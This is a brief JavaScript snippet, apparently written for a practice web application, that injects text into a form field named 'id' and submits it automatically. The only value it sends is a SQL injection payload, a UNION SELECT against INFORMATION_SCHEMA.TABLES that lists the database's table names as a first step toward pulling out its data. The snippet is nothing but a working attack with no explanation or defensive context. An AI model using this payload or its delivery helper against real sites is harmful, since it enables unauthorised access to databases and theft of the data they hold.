function send_sql(command){
    inp = document.getElementsByName("id")[0];
    inp.value = command;
    button = document.getElementsByName("Submit")[0];
    button.click()
}
send_sql("' UNION SELECT 1, TABLE_NAME FROM INFORMATION_SCHEMA.TABLES");
